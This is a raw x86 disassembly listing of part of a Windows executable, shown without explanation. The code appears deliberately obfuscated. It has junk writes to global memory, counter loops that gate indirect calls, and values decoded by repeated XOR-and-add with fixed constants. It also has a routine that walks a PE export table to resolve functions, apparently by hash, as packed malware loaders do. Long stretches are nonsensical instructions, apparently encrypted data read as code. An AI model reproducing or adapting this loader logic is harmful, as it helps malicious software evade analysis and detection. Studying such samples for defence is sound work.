  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e6cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4303d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ed59
  40cd16:	mov    eax,ds:0x43037d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ecd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43036d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4303e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e6c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430371,0x42eccf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430339,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43033d,0x430349
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42eccb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430349,0x0
  40cde2:	mov    eax,ds:0x430349
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430349,eax
  40cded:	cmp    DWORD PTR ds:0x430349,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e9cf
  40ce06:	cmp    DWORD PTR ds:0x430349,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ecd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4303cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ece3,0x4303df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e6cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43033d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43033d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43033d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e6dc
  40cec0:	push   0x42e7e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eb43
  40ced0:	cmp    DWORD PTR ds:0x43033d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43033d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43033d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43033d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43033d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e6d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e6d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e6d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43034d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eb47
  40cf36:	cmp    DWORD PTR ds:0x42e6d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e6d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e6d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e6d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e6d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ecef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e6c4
  40cf7a:	sbb    DWORD PTR ds:0x430335,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4303db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4303db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4303db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ecdb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e90f
  40cfbd:	cmp    DWORD PTR ds:0x4303db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4303db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4303db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4303db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4303db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ecf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ecf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ecf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e6d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eb4b
  40d024:	cmp    DWORD PTR ds:0x42ecf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ecf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ecf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ecf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ecf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430339,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430339
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430339,esi
  40d067:	cmp    DWORD PTR ds:0x430339,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e913
  40d087:	cmp    DWORD PTR ds:0x430339,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ecdb
  40d09f:	sub    DWORD PTR ds:0x42e6bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ecdf
  40d0b2:	xor    DWORD PTR ds:0x42ece7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e6d4
  40d0c3:	or     DWORD PTR ds:0x430341,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ecf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43034d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ecdb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4303eb
  40d0ed:	xor    DWORD PTR ds:0x42ecdf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ecd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42eccf
  40d10b:	or     DWORD PTR ds:0x42ecdb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [edx-0x6490bfa],eax
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	in     eax,dx
  40d12f:	and    eax,0x25d39da8
  40d134:	div    BYTE PTR ds:0x523db49a
  40d13a:	inc    ebx
  40d13b:	rcr    BYTE PTR ds:0x1064b809,cl
  40d141:	push   ss
  40d142:	js     0x40d0da
  40d144:	jne    0x40d11c
  40d146:	arpl   WORD PTR [esi+0x19],bx
  40d149:	jb     0x40d13d
  40d14b:	(bad)  
  40d14c:	jmp    0x40d0e3
  40d14e:	push   edi
  40d14f:	mov    esi,0xcbd0a697
  40d154:	pop    edx
  40d155:	in     al,dx
  40d156:	lods   al,BYTE PTR ds:[esi]
  40d157:	jno    0x40d1a9
  40d159:	add    dl,BYTE PTR [edi+esi*2]
  40d15c:	rol    BYTE PTR [ebp-0x39f8147b],1
  40d162:	scas   eax,DWORD PTR es:[edi]
  40d163:	cdq    
  40d164:	mov    edx,0x521cabf1
  40d169:	dec    edx
  40d16a:	xchg   esi,eax
  40d16b:	inc    edx
  40d16c:	daa    
  40d16d:	aad    0xe2
  40d16f:	lods   al,BYTE PTR ds:[esi]
  40d170:	idiv   DWORD PTR [edx+0x4a119cc8]
  40d176:	cmp    al,0x13
  40d178:	outs   dx,BYTE PTR ds:[esi]
  40d179:	and    eax,0x97ed5b2c
  40d17e:	pop    edi
  40d17f:	ror    ah,1
  40d181:	pop    edi
  40d182:	jl     0x40d196
  40d184:	xchg   esp,eax
  40d185:	inc    eax
  40d186:	es sbb eax,0x256563a2
  40d18c:	lock jb 0x40d1e2
  40d18f:	sub    BYTE PTR [eax+0x77],dh
  40d192:	xchg   bh,al
  40d194:	add    eax,0xee1c01fc
  40d199:	pop    edx
  40d19a:	ja     0x40d124
  40d19c:	lock out dx,al
  40d19e:	call   0xac844099
  40d1a3:	xor    DWORD PTR [edx+0x222d3536],edi
  40d1a9:	mov    ecx,0xd5d55ec9
  40d1ae:	or     DWORD PTR [edx-0x48],0xffffffc4
  40d1b2:	mov    dh,0xe7
  40d1b4:	xchg   ecx,eax
  40d1b5:	mov    al,ds:0x24bbe8be
  40d1ba:	xor    dl,BYTE PTR [edx-0x45754465]
  40d1c0:	lods   eax,DWORD PTR ds:[esi]
  40d1c1:	mov    cs,esi
  40d1c3:	jmp    FWORD PTR [ebp+0x30cdb7a6]
  40d1c9:	xchg   ebp,eax
  40d1ca:	aaa    
  40d1cb:	outs   dx,DWORD PTR ds:[esi]
  40d1cc:	adc    BYTE PTR [ebx],bh
  40d1ce:	mov    ebp,0x1bb1523d
  40d1d3:	pop    ebp
  40d1d4:	dec    edx
  40d1d5:	push   edx
  40d1d6:	cmc    
  40d1d7:	adc    al,BYTE PTR [ebp-0x27288ef6]
  40d1dd:	fstp   QWORD PTR [edx+0x49397a34]
  40d1e3:	jmp    0xf07:0xf7c9ac10
  40d1ea:	pop    edx
  40d1eb:	out    0xd,al
  40d1ed:	and    BYTE PTR [ebx+esi*1-0x42d13577],bh
  40d1f4:	or     bh,dh
  40d1f6:	push   ebp
  40d1f7:	popa   
  40d1f8:	pop    ebp
  40d1f9:	jg     0x40d1d2
  40d1fb:	inc    ecx
  40d1fc:	push   eax
  40d1fd:	and    al,0x30
  40d1ff:	mov    al,0xb8
  40d201:	mov    ebx,0xfe7db558
  40d206:	repnz pop ebp
  40d208:	stc    
  40d209:	jl     0x40d1e9
  40d20b:	ja     0x40d1e6
  40d20d:	sbb    BYTE PTR [edi],al
  40d20f:	lahf   
  40d210:	lods   eax,DWORD PTR ds:[esi]
  40d211:	add    bl,bh
  40d213:	arpl   di,bp
  40d215:	outs   dx,BYTE PTR ds:[esi]
  40d216:	push   ebp
  40d217:	les    ecx,FWORD PTR [esi*4+0x24ad2640]
  40d21e:	add    eax,0x751ec97d
  40d223:	lds    eax,FWORD PTR [ebp+0x7ada8ee3]
  40d229:	rcr    esp,cl
  40d22b:	xchg   esi,eax
  40d22c:	and    ah,bl
  40d22e:	cmp    eax,0x6303c780
  40d233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d234:	sub    dh,BYTE PTR [esi+0x47ca803]
  40d23a:	loop   0x40d1ea
  40d23c:	stos   BYTE PTR es:[edi],al
  40d23d:	mov    esp,0x19422ebc
  40d242:	popa   
  40d243:	inc    edi
  40d244:	arpl   WORD PTR [edx],bp
  40d246:	xor    DWORD PTR [ebx+ebp*8],ecx
  40d249:	dec    ecx
  40d24a:	arpl   WORD PTR [ecx+0x701dd66e],bx
  40d250:	xchg   esi,eax
  40d251:	and    BYTE PTR [eax+0x75],bl
  40d254:	or     ch,bh
  40d256:	xor    BYTE PTR [ebp-0x34fc8e14],dh
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4303e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ece7,0x42e6c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ecef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ecdf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ecd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430339,0x430345
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4303df
  40d2bf:	add    DWORD PTR ds:0x42ecd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e86f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430365,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43035d,0x42ecd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e6c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430349,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430365,0x43033d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e6c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42eceb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430349,0x4303d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430335,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43034d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430361,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43035d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43035d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43035d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43035d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430341
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e9d3
  40d3b2:	cmp    DWORD PTR ds:0x43035d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0x8e6a8e30
  40d410:	loop   0x40d48e
  40d412:	mov    ch,BYTE PTR [ebp+0x227e7e8e]
  40d418:	jg     0x40d498
  40d41a:	jle    0x40d436
  40d41c:	lock fs mov ecx,0x68ccfebb
  40d423:	jnp    0x40d3dd
  40d425:	add    eax,0x3f6dc905
  40d42a:	xor    DWORD PTR [ebp+ebp*4+0x1fd11fd8],ecx
  40d431:	lahf   
  40d432:	into   
  40d433:	cmp    eax,0x77511097
  40d438:	ds (bad) 
  40d43a:	push   esp
  40d43b:	dec    ebp
  40d43c:	push   cs
  40d43d:	imul   ebx,DWORD PTR [eax],0x43a51356
  40d443:	lods   al,BYTE PTR ds:[esi]
  40d444:	ret    
  40d445:	fnstsw WORD PTR [eax-0x5e724667]
  40d44b:	add    DWORD PTR [esi+0x2773b68b],esp
  40d451:	mov    eax,ds:0xfe0bd837
  40d456:	test   BYTE PTR [edi],bh
  40d458:	mov    ecx,fs
  40d45a:	stos   DWORD PTR es:[edi],eax
  40d45b:	stos   DWORD PTR es:[edi],eax
  40d45c:	pop    ecx
  40d45d:	jae    0x40d4a2
  40d45f:	mov    eax,0x5aee09da
  40d464:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d466:	sub    al,0x6
  40d468:	or     DWORD PTR [edi],ecx
  40d46a:	sahf   
  40d46b:	or     eax,0xac3aab35
  40d470:	adc    BYTE PTR [ebx],cl
  40d472:	rcr    DWORD PTR [esi+0x35],1
  40d475:	add    esi,DWORD PTR [edi-0x55]
  40d478:	je     0x40d4c5
  40d47a:	cli    
  40d47b:	fistp  DWORD PTR [esi]
  40d47d:	mov    ebx,0x2efe3a43
  40d482:	sub    eax,0xc22d303b
  40d487:	jle    0x40d4e0
  40d489:	xor    ecx,DWORD PTR [edi-0x3bcad8f5]
  40d48f:	fs (bad) 
  40d491:	cld    
  40d492:	les    ebp,FWORD PTR [ebx+eax*4]
  40d495:	xchg   ecx,eax
  40d496:	inc    esp
  40d497:	fisttp WORD PTR [eax-0x6c]
  40d49a:	es ja  0x40d454
  40d49d:	and    ecx,edx
  40d49f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4a0:	mov    ch,0xc4
  40d4a2:	sbb    BYTE PTR [ebx-0xea45e99],ah
  40d4a8:	inc    esi
  40d4a9:	cmp    DWORD PTR [ebx+ecx*2+0x41b954fd],eax
  40d4b0:	addr16 popa 
  40d4b2:	int    0xeb
  40d4b4:	sub    DWORD PTR ds:0x87835f4d,esi
  40d4ba:	not    DWORD PTR ds:0x2fe85d5d
  40d4c0:	dec    edx
  40d4c1:	jmp    0x3533e736
  40d4c6:	inc    esi
  40d4c7:	cmp    DWORD PTR [eax+0x1a],edi
  40d4ca:	in     eax,dx
  40d4cb:	and    BYTE PTR [esp+0x5a6d8575],dh
  40d4d2:	xlat   BYTE PTR ds:[ebx]
  40d4d3:	cmp    DWORD PTR [edi-0xc],eax
  40d4d6:	mov    esi,0x34bb83d1
  40d4db:	jmp    0xcde9252c
  40d4e0:	or     dl,BYTE PTR [ebp+eax*1-0x36c7718]
  40d4e7:	jmp    0xd354:0x3ce123b9
  40d4ee:	jnp    0x40d501
  40d4f0:	iret   
  40d4f1:	lods   al,BYTE PTR ds:[esi]
  40d4f2:	sahf   
  40d4f3:	jmp    0x40d4e3
  40d4f5:	push   es
  40d4f6:	push   edx
  40d4f7:	pop    ebp
  40d4f9:	push   ecx
  40d4fa:	aad    0x69
  40d4fc:	adc    eax,0x8b1b174b
  40d501:	iret   
  40d502:	inc    eax
  40d503:	mov    edi,esi
  40d505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d506:	add    ch,BYTE PTR [eax+0x2bfc3dad]
  40d50c:	jecxz  0x40d4bd
  40d50e:	aas    
  40d50f:	sbb    DWORD PTR gs:[esi],edx
  40d512:	adc    DWORD PTR [esi-0x78],edi
  40d515:	adc    edx,DWORD PTR [eax]
  40d517:	mov    ebp,0x7c6e016f
  40d51c:	mov    esp,0x78d39e7c
  40d521:	adc    DWORD PTR [ecx*1+0x43dc4a80],0x4d
  40d529:	cmp    al,0x66
  40d52b:	push   ds
  40d52c:	bound  ebp,QWORD PTR [eax]
  40d52e:	and    edx,eax
  40d530:	inc    esi
  40d531:	das    
  40d532:	dec    ebx
  40d533:	pmulhuw mm2,QWORD PTR [eax]
  40d536:	mov    ebp,0xc11dc3c6
  40d53b:	add    DWORD PTR [esi],0x7d
  40d53e:	sbb    al,0x83
  40d540:	fnstcw WORD PTR [eax]
  40d542:	cdq    
  40d543:	imul   DWORD PTR [esi+0x7f]
  40d546:	stos   DWORD PTR es:[edi],eax
  40d547:	push   DWORD PTR [ebp+0xc]
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	jmp    0x519b6cbc
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d552
  40d5c4:	xchg   ebx,eax
  40d5c5:	mov    eax,DWORD PTR [esi-0x5ea78eec]
  40d5cb:	neg    BYTE PTR [edi]
  40d5cd:	loop   0x40d59f
  40d5cf:	in     eax,0x14
  40d5d1:	and    edi,DWORD PTR [edi+edx*2-0xb]
  40d5d5:	scas   al,BYTE PTR es:[edi]
  40d5d6:	or     BYTE PTR [eax-0x41],ah
  40d5d9:	lods   al,BYTE PTR ds:[esi]
  40d5da:	gs loope 0x40d642
  40d5dd:	scas   al,BYTE PTR es:[edi]
  40d5de:	jle    0x40d5c3
  40d5e0:	ror    ebx,0xc3
  40d5e3:	das    
  40d5e4:	int    0xa7
  40d5e6:	and    edx,eax
  40d5e8:	xor    ecx,DWORD PTR [ecx-0x72]
  40d5eb:	inc    esp
  40d5ec:	add    bl,BYTE PTR [edi]
  40d5ee:	xchg   edx,eax
  40d5ef:	cli    
  40d5f0:	pop    eax
  40d5f1:	jne    0x40d5f8
  40d5f3:	push   esp
  40d5f4:	sbb    BYTE PTR [ecx+ebp*8-0x4],dl
  40d5f8:	cmp    BYTE PTR [ecx],ah
  40d5fa:	rol    BYTE PTR [ebx-0x77ec239],cl
  40d600:	bound  edx,QWORD PTR [ebx+0x4bb954ce]
  40d606:	mov    cs,WORD PTR [ecx+0x541652d4]
  40d60c:	test   al,0x4c
  40d60e:	and    al,0x25
  40d610:	int    0x63
  40d612:	and    al,0x36
  40d614:	mov    WORD PTR [ebx],ds
  40d616:	and    eax,0xbf9c6af2
  40d61b:	add    dl,BYTE PTR [edi-0x45]
  40d61e:	fcomp  QWORD PTR [eax]
  40d620:	push   ss
  40d621:	(bad)  
  40d622:	repz push ds
  40d624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d625:	cld    
  40d626:	and    esp,DWORD PTR [edi]
  40d628:	arpl   WORD PTR [ebx],cx
  40d62a:	popa   
  40d62b:	nop
  40d62c:	push   ebx
  40d62d:	in     eax,0xe8
  40d62f:	retf   0x4115
  40d632:	lods   eax,DWORD PTR ds:[esi]
  40d633:	xor    al,0x11
  40d635:	adc    al,0x3f
  40d637:	ins    BYTE PTR es:[edi],dx
  40d638:	sub    eax,0x533107e1
  40d63d:	ret    0x7f8b
  40d640:	push   0xa264f990
  40d645:	add    BYTE PTR [ebx+0x19d22eb1],0xa9
  40d64c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d64d:	aam    0x22
  40d64f:	xor    BYTE PTR [eax-0x1198e6ea],ch
  40d655:	adc    BYTE PTR [edx-0x35],dh
  40d658:	mov    edx,DWORD PTR [edi-0x692af0a8]
  40d65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d65f:	xor    al,BYTE PTR [ecx]
  40d661:	sbb    ch,ah
  40d663:	add    al,BYTE PTR [eax]
  40d665:	pop    ebp
  40d666:	mov    esp,0xca0152b1
  40d66b:	xchg   ebx,eax
  40d66c:	ror    edx,0xa1
  40d66f:	out    dx,al
  40d670:	out    dx,eax
  40d671:	inc    esp
  40d672:	add    ebp,DWORD PTR ds:[edx+0x40]
  40d676:	sub    ebx,DWORD PTR [ecx]
  40d678:	stos   DWORD PTR es:[edi],eax
  40d679:	dec    eax
  40d67a:	push   edi
  40d67b:	dec    edx
  40d67c:	adc    BYTE PTR [edi+0x32878427],dl
  40d682:	inc    eax
